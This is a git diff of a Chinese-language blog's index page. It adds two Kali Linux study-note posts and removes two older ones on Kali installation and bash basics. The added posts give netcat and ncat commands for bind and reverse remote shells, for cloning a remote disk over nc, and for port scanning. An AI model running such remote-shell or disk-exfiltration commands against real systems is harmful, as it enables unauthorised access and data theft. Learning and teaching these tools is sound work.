@@ -240,6 +240,405 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/25/%E4%BB%BB%E5%8A%A1012%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E3%80%81NCAT%E3%80%81WIRESHARK%E3%80%81WIRESHARK-%E7%AD%9B%E9%80%89%E5%99%A8%E3%80%81%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/25/%E4%BB%BB%E5%8A%A1012%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E3%80%81NCAT%E3%80%81WIRESHARK%E3%80%81WIRESHARK-%E7%AD%9B%E9%80%89%E5%99%A8%E3%80%81%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/" itemprop="url">012：Kali Linux基本工具-远程控制、NCAT、WIRESHARK、WIRESHARK-筛选器、常见协议</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-25T21:22:48+08:00">
+                2019-11-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ol>
+<li><p>NC-远程控制</p>
+<ul>
+<li>正向<ul>
+<li>A:<strong><code>🔺命令：nc -lp 端口 -c bash</code></strong></li>
+<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号</code></strong></li>
+</ul>
+</li>
+<li>反向<ul>
+<li>A:<strong><code>🔺命令：nc -lp 端口号</code></strong></li>
+<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号 -c bash</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>Windows用户把bash改成cmd
+IDC机房可以采用服务器作为客户端，由内网向外网连接侦听的外部服务器，传递bash</code></pre></blockquote>
+<ol start="2">
+<li><p>NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat</p>
+<ul>
+<li>NC缺乏加密和身份验证的能力（可被嗅探，基本上是透明的，可在外部系统加密再进行传输）</li>
+<li>Ncat包含nmap工具包中</li>
+<li>A:<strong><code>🔺命令：ncat -c bash --allow IP地址 -vnl 端口号 --ssl</code></strong></li>
+<li>B:<strong><code>🔺命令：ncat -nv IP地址 端口 --ssl</code></strong></li>
+<li>不同系统/平台的nc参数功能不尽相同</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>window系统不存在-c参数，需要通过中间文本去传递shell
+查询用户手册：**`🔺命令：man nc（man手册）`**or **`🔺命令：nc -h`**</code></pre></blockquote>
+<ol start="3">
+<li><p>WIRESHARK</p>
+<ul>
+<li>抓包嗅探协议分析</li>
+<li>安全专家必备的技能</li>
+<li>抓包引擎<ul>
+<li>Libpcap9–Linux</li>
+<li>Winpcap10–Windows</li>
+</ul>
+</li>
+<li>解码能力（衡量抓包软件能力强弱）</li>
+</ul>
+</li>
+<li><p>WIRESHARK-基本使用</p>
+<ul>
+<li>启动</li>
+<li>选择抓包网卡</li>
+<li>混杂模式</li>
+<li>实时抓包</li>
+<li>保存和分析捕获文件</li>
+<li>首选项（布局调整：Edit → Preferences）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>混杂模式会抓以太网内所有的包，非混杂只抓取到达自己网卡的包（Enable promiscuous mode on all interfaces）
+抓包筛选器（Capture Filter），可自己设置（如：host ip地址）</code></pre></blockquote>
+<ol start="5">
+<li><p>WIRESHARK-筛选器</p>
+<ul>
+<li>过滤掉干扰的数据包</li>
+<li>抓包筛选器</li>
+<li>显示筛选器（右键 → Apply as Filter，可对任何数据）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>Network → Capture Filters → Capture Engine → Dispaly Filters</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/25/%E4%BB%BB%E5%8A%A1011%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-NETCAT%EF%BC%88%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E3%80%81%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%81%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/11/25/%E4%BB%BB%E5%8A%A1011%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-NETCAT%EF%BC%88%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E3%80%81%E6%B5%81%E5%AA%92%E4%BD%93%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%81%E8%BF%9C%E7%A8%8B%E5%85%8B%E9%9A%86%E7%A1%AC%E7%9B%98%EF%BC%89/" itemprop="url">011：Kali Linux基本工具-NETCAT（传输文件-目录、流媒体服务器、端口扫描、远程克隆硬盘）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-25T21:22:48+08:00">
+                2019-11-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ol>
+<li><p>NC-传输文件/目录</p>
+<ul>
+<li>传输文件<ul>
+<li>A:<strong><code>🔺命令：nc -lp 端口号&gt;x.mp4</code></strong>（接收端）</li>
+<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号&lt; x.mp4 -q 1</code></strong>（发送端）</li>
+<li>or</li>
+<li>A:<strong><code>🔺命令：nc -lp 端口号 &lt; x.mp4 -q 1</code></strong>（发送端）</li>
+<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 &gt;x.mp4</code></strong>（接收端）</li>
+</ul>
+</li>
+<li>传输目录 ▲2019.11.25实验未成功<ul>
+<li>A:<strong><code>🔺命令：tar -cvf -文件名/ | nc -lp 端口号 -q 1</code></strong>（发送端）</li>
+<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | tar -xvf -</code></strong>（接收端）</li>
+</ul>
+</li>
+<li>加密传文件（操作系统安装的mcrypt）<ul>
+<li>A:<strong><code>🔺命令：nc -lp 端口号 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; x.mp4</code></strong>（接收端）</li>
+<li>B:<strong><code>🔺命令：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; x.mp4 | nc -nv ip地址 端口号 -q 1</code></strong>（发送端）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>NC-流媒体服务（需安装mplayer）</p>
+<ul>
+<li>A:<strong><code>🔺命令：cat x.mp4 | nc -lp 端口号</code></strong></li>
+<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | mplayer -vo x11 -cache 3000 -</code></strong></li>
+</ul>
+</li>
+<li><p>NC-端口扫描</p>
+<ul>
+<li><strong><code>🔺命令：nc -nvz ip地址 x-x</code></strong>(TCP端口号)</li>
+<li><strong><code>🔺命令：nc -nvzu ip地址 x-x</code></strong>(UDP端口号)</li>
+</ul>
+</li>
+<li><p>NC-远程克隆硬盘 ▲2019.11.25未验证</p>
+<ul>
+<li>A:<strong><code>🔺命令：nc -lp 端口号 | dd of=/dev/sda</code></strong></li>
+<li>B:<strong><code>🔺命令：dd if=/dev/sda | nc -nv IP地址 端口号 -q 1</code></strong></li>
+<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>硬盘删除文件，只删除文件名的索引，不完整删除文件，进行标记，可以进行恢复
+dd进行磁盘复制，是完整的镜像硬盘复制，包括删除的文件标记</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/25/%E4%BB%BB%E5%8A%A1010%EF%BC%9AKali%20Linux%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-NETCAT%EF%BC%88telnet-banner%E3%80%81%E4%BC%A0%E8%BE%93%E6%96%87%E6%9C%AC%E4%BF%A1%E6%81%AF%EF%BC%89/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2249,587 +2648,6 @@ o-----页内偏移（s位，每页有2的s次方字节）
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/%E4%BB%BB%E5%8A%A1004%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85-%E7%86%9F%E6%82%89%E7%8E%AF%E5%A2%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/21/%E4%BB%BB%E5%8A%A1004%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85-%E7%86%9F%E6%82%89%E7%8E%AF%E5%A2%83/" itemprop="url">004：Kali Linux安装-熟悉环境</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-21T20:50:33+08:00">
-                2019-11-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <ol>
-<li>熟悉BASH命令</li>
-</ol>
-<blockquote>
-<pre><code>终端界面为一个Shell,用户与系统交互的一个通道
-A shell、B shell（kali默认）、D shell</code></pre></blockquote>
-<ul>
-<li>ls(查看文件)<ul>
-<li>ls -l 查看常规格式显示文件信息 </li>
-<li>ls /dev -l 目录第一个参数基本涵盖</li>
-<li>ls -a 显示所有文件信息（显示隐藏文件）</li>
-<li>ls -lh 以容易阅读的方式显示文件大小</li>
-<li>ls -lh –sort=size 以大小进行排序</li>
-<li>ls -lh –sort=time 以时间进行排序</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>第一个参数属性：
-c--表示一个字符型设备
-d--表示一个目录
-l--表示一个链接，类似于window里面的快捷方式
-b--表示一个块设备，block，硬盘分区sda</code></pre></blockquote>
-<ul>
-<li>cd（进入某个目录）<ul>
-<li>cd . 当前目录</li>
-<li>cd .. 当前目录的上一级目录</li>
-</ul>
-</li>
-<li>pwd（查看当前工作目录）</li>
-<li>cat（查看日志文件内容）<ul>
-<li>cat /var/log/message（系统改变的信息）</li>
-</ul>
-</li>
-<li>more(查看系统变化信息，下一屏幕通过Enter，q退出，同cat)</li>
-<li>less(查看文件，跟more命令基本一样，同cat)</li>
-<li>tail(默认显示最下面10行的内容，同cat)<ul>
-<li>tail -20（查看最下面二十行）</li>
-</ul>
-</li>
-<li>watch -n 指定进程 tail -行数 文件（watch和tail的联合）</li>
-<li>cp（对文件进行复制）<ul>
-<li>cp 文件名1 文件名2</li>
-<li>cp -r 目录1 目录2</li>
-</ul>
-</li>
-<li>rm（删除文件）<ul>
-<li>rm 文件名</li>
-<li>rm -r 目录名</li>
-</ul>
-</li>
-<li>top(监视linux系统性能参数，每隔几秒钟进行更新，q退出)<ul>
-<li>kill 进行PID（在top界面）</li>
-</ul>
-</li>
-<li>ps（查看进程信息）<ul>
-<li>ps -ef（查看进程详细信息，PPID父进程）</li>
-<li>ps aux（同-ef显示项目相同，显示列信息稍微不同）</li>
-</ul>
-</li>
-<li>grep（筛选输出内容）<ul>
-<li>grep 所查内容 路径（例如：grep ssh /etc/passwd）</li>
-</ul>
-</li>
-<li>ifconfig（查看当前网络配置信息）<ul>
-<li>ifconfig 网卡 down（关闭网卡，macchanger -m 新MAC地址 网卡）</li>
-</ul>
-</li>
-<li>netstat（查看网络连接信息）<ul>
-<li>netstat -pantu（查看计算机与服务器产生的TCP、UDP连接）</li>
-<li>netstat -pantu | egrep -v ‘0.0.0.0’| awk ‘{print $5}’</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>netstat -pantu | egrep -v &apos;0.0.0.0&apos;| awk &apos;{print $5}&apos; | cut -d &apos;:&apos; -f 1| egrep -v &apos;And&apos;| egrep -v &apos;Address&apos; | sort | uniq &gt; ip(文件)
-awk--只显示（$列数）的数据，以空格作为间隔
-sort--排序
-cut--同egrep，分隔
-uniq--把重复的内容只显示一次</code></pre></blockquote>
-<ul>
-<li>route(路由，网络信息)</li>
-<li>mount（挂载文件夹，可本地可远程）<ul>
-<li>mount -o loop iso文件 路径</li>
-</ul>
-</li>
-<li>dmesg(查看messages文件内容，同tail，但不需要路径)</li>
-<li>find（查找文件，目录）<ul>
-<li>find 查找开始位置 -name “文件名称”（区分大小写）</li>
-<li>find 查找开始位置 -iname “文件名称”（不区分大小写） </li>
-<li>find .（当前目录） -name “文件名+通配符”</li>
-<li>find .（当前目录） -name “文件名+通配符” -exec cp () /路径/{}.bak ;（隐藏目录不操作）</li>
-</ul>
-</li>
-<li>whereis（系统数据库搜索路径，需要通过本地包安装，不可源码安装） <ul>
-<li>whereis -b 文件名（查看二进制文件）</li>
-<li>updatedb（更新whereis的数据库）</li>
-</ul>
-</li>
-<li>echo（在当前终端窗口显示信息）</li>
-<li>vi（文本编辑器）<ul>
-<li>vi 目标文件（编辑目标文件）</li>
-<li>：set number（显示行号）</li>
-<li>：wq（写入退出）</li>
-<li>i（插入模式）</li>
-<li>esc（退出模式）</li>
-<li>dd（删除一整行）</li>
-<li>o（插入一行）</li>
-<li>Y（复制）,T（黏贴）</li>
-</ul>
-</li>
-</ul>
-<ol start="2">
-<li><p>管道</p>
-<ul>
-<li>cat /varc/log/messages | grep ssl</li>
-<li>cd aaa &amp; ls （前后两个命令依次执行）</li>
-<li>cd aaa &amp;&amp; ls（如果前面执行成功，才执行后面的命令）</li>
-<li>cd aaa || ls（如果前面执行不成功，才去执行后面的命令）</li>
-</ul>
-</li>
-<li><p>shell脚本</p>
-<ul>
-<li>1.sh<ul>
-<li>chmod =x 1.sh</li>
-<li>./1.sh</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo -n &apos;IP:&apos;&apos;  //-n光标不换行</span><br><span class="line">read ip</span><br><span class="line">echo &apos;your ip is:&apos; $ip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>99.sh<ul>
-<li>chmod =x 99.sh</li>
-<li>./99.sh</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for n in `seq 9`  //9的序列</span><br><span class="line">do</span><br><span class="line">   for m in `seq $n`</span><br><span class="line">   do</span><br><span class="line">   echo -n &quot;$m*$n=&quot; `expr $m \ * $n`&quot; &quot;</span><br><span class="line">   done</span><br><span class="line"> echo</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>ping.sh(活着的ip地址)<ul>
-<li>chmod -x ping.sh</li>
-<li>./ping.sh</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for n in `seq 254`</span><br><span class="line">do</span><br><span class="line">   ping 192.168.100.$n -c 1 | grep ttl | awk &apos;&#123;print $4&#125;&apos;| awk -F: &apos;&#123;print $1&#125;&apos;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>s1.sh(需要一个扫描预文件ip1)▲还未实现<ul>
-<li>chmod -x s1.sh</li>
-<li>./s1.sh</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">A=&apos;cat ip1&apos;</span><br><span class="line">for B in $A</span><br><span class="line">do</span><br><span class="line">   n=&apos;echo $B | wc -L&apos;</span><br><span class="line">   if [ $n -gt 6 ] ; then</span><br><span class="line">      ip=$B</span><br><span class="line">   else</span><br><span class="line">       port=$B</span><br><span class="line">       namp -p$port -sV $ip | grep -v Starting | grep -v Host | grep -v PORT | grep -v Service | grep -v done &gt;&gt; r1</span><br><span class="line">       fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/%E4%BB%BB%E5%8A%A1003%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85-%E6%8C%81%E4%B9%85%E5%8A%A0%E5%AF%86USB%E5%AE%89%E8%A3%85%E3%80%81%E7%86%9F%E6%82%89BASH%E5%91%BD%E4%BB%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/11/21/%E4%BB%BB%E5%8A%A1003%EF%BC%9AKali%20Linux%E5%AE%89%E8%A3%85-%E6%8C%81%E4%B9%85%E5%8A%A0%E5%AF%86USB%E5%AE%89%E8%A3%85%E3%80%81%E7%86%9F%E6%82%89BASH%E5%91%BD%E4%BB%A4/" itemprop="url">003：Kali Linux安装-持久加密USB安装、熟悉BASH命令</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-21T20:50:33+08:00">
-                2019-11-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <ol>
-<li>持久加密USB安装</li>
-</ol>
-<blockquote>
-<p>共享文件夹：/medie/sf_D_Drive（物理主机目录）（2.0版本在/mnt/hfgs下）</p>
-</blockquote>
-<ul>
-<li>LUKS：Linux Unified Key Setup（基于Linux平台开发）<ul>
-<li>磁盘分区加密规范</li>
-<li>不依赖于操作系统的磁盘级加密</li>
-<li>Windows-DoxBox（通过前端后端组件进行加密）</li>
-<li>后端：dm-crypt</li>
-<li>前端：cryptsetup</li>
-<li>微软的bitlocker</li>
-</ul>
-</li>
-<li>将镜像刻录到U盘</li>
-</ul>
-<blockquote>
-<p>1.操作系统的删除文件名，只是删除索引，可通过数据还原技术再恢复</p>
-</blockquote>
-<blockquote>
-<p>(1)文件拷贝：拷贝单个文件到设备</p>
-</blockquote>
-<blockquote>
-<p>(2)块拷贝：将原磁盘每一个扇区存取的每一块数据完全镜像复制到设备（电子取证）</p>
-</blockquote>
-<ul>
-<li><p>将镜像刻录到U盘</p>
-<p> <strong><code>🔺命令：dd if=kail-linux-1.1.0-amd64.iso of=/dev/sdb bs=1M</code></strong></p>
-<p> if：input file </p>
-<p> of：out file bs（复制速度）</p>
-<p> dd(以基于块的模式拷贝到块设备，不同基于文件拷贝)</p>
-<p> <strong><code>🔺命令：dmesg</code></strong>查看系统操作变化</p>
-<ul>
-<li>查看插入的u盘所在的位置/sdx</li>
-<li>查看U盘原有数据（系统工具-系统管理-Gpatted分区管理器）</li>
-<li>卸载分区</li>
-<li>删除分区</li>
-<li>应用操作</li>
-<li>应用dd命令，以块的形式，拷贝到U盘（U盘剩下的空间用于系统加密，若有进行操作，将操作记录在加密部分）</li>
-</ul>
-<p><strong><code>🔺命令：watch -n 5 killall USR1 dd</code></strong>(汇报工作进展）</p>
-</li>
-</ul>
-<blockquote>
-<p>1.Window下的efs加密–文件级别加密，用管理员登陆，可以看到文件加密的信息</p>
-</blockquote>
-<blockquote>
-<p>2.磁盘分区级别的加密，需要密钥，需要证书才可以解出</p>
-</blockquote>
-<ol start="2">
-<li><p>持久加密USB安装-2</p>
-<ul>
-<li>为U盘创建额外分区<ul>
-<li><strong><code>🔺命令：partx</code></strong>分区工具</li>
-<li><strong><code>🔺命令：printf devices</code></strong>列出操作系统挂载的硬盘</li>
-<li><strong><code>🔺命令：select /dev/sdx</code></strong>选择要操作的U盘</li>
-<li><strong><code>🔺命令：mkpart primary</code></strong>起始位置（上一个分区位置）结束位置（分区大小）</li>
-<li><strong><code>🔺命令：quit</code></strong>退出分区工具</li>
-</ul>
-</li>
-<li>使用LUKS加密分区<ul>
-<li><strong><code>🔺命令：cryptsetup --verbose --verify-passphrase luksFormat /dev/</code></strong>sdx+分区</li>
-<li>输入保护密码</li>
-</ul>
-</li>
-<li>打开加密分区<ul>
-<li><strong><code>🔺命令：cryptsetup luksOpen /dev/sdx+分区 usb（可读名称）</code></strong></li>
-<li><strong><code>🔺命令：ls /dev/mapper/usb（可读名称）</code></strong></li>
-</ul>
-</li>
-<li>格式化加密分区+卷标<ul>
-<li><strong><code>🔺命令：mkfs.ext4（目前最新版本） /dev/mapper/usb（可读名称）</code></strong></li>
-<li><strong><code>🔺命令：e2label /dev/mapper/usb（可读名称）persistence（官方指定卷标）</code></strong></li>
-</ul>
-</li>
-<li>挂载加密分区，并创建persistence.conf文件<ul>
-<li><strong><code>🔺命令：mkdir -p /mnt/usb</code></strong></li>
-<li><strong><code>🔺命令：mount /dev/mapper/usb /mnt/usb/</code></strong></li>
-<li><strong><code>🔺命令：echo &quot;/ union&quot; &gt; /mnt/usb/persistence.conf</code></strong></li>
-<li><strong><code>🔺命令：umount /dev/mapper/usb</code></strong></li>
-<li><strong><code>🔺命令：cryptsetup luksClose /dev/mapper/usb</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>持久加密USB安装-3</p>
-<p> Live USB Encrypted Persistence</p>
-</li>
-<li><p>熟悉环境</p>
-<ul>
-<li>登陆密码</li>
-<li>Top10安全工具<ul>
-<li>aircrack-ng（wifi无线渗透）</li>
-<li>hydra，john（密码破解）</li>
-<li>burpsuit（web渗透）</li>
-<li>maltego（信息收集）</li>
-<li>metasploit framework（渗透测试框架，跟kail同个水平）</li>
-<li>nmap（网络发现层的扫描器）</li>
-<li>owasp-zap（web渗透测试工具）</li>
-<li>sqlmap（sql注入工具，python语言开发）</li>
-<li>wireshark（抓包分析工具）</li>
-</ul>
-</li>
-<li>字体调整<ul>
-<li><strong><code>🔺命令：gnome-tweak-tool</code></strong></li>
-</ul>
-</li>
-<li>监视网络流量<ul>
-<li><strong><code>🔺命令：apt-get install netspeed</code></strong>（2.0版本得上官网下载）</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<blockquote>
-<p>新的安装方式：<a href="https://blog.csdn.net/coding_or_dead/article/details/53523596" target="_blank" rel="noopener">https://blog.csdn.net/coding_or_dead/article/details/53523596</a></p>
-</blockquote>
-<blockquote>
-<p>扩展在software中，可以看到Extension setting</p>
-</blockquote>
-<ul>
-<li>监视网络流量<ul>
-<li>按住alt，右键添加网络流量监视（显示字节形式）</li>
-</ul>
-</li>
-<li>强行终止程序<ul>
-<li>按住alt，右键添加强制退出</li>
-</ul>
-</li>
-<li>文件目录</li>
-</ul>
-<blockquote>
-<p>/medir /mnt 都可以挂载目录，个人使用习惯</p>
-</blockquote>
-<ul>
-<li>共享文件</li>
-</ul>
-
-          
-        
-      
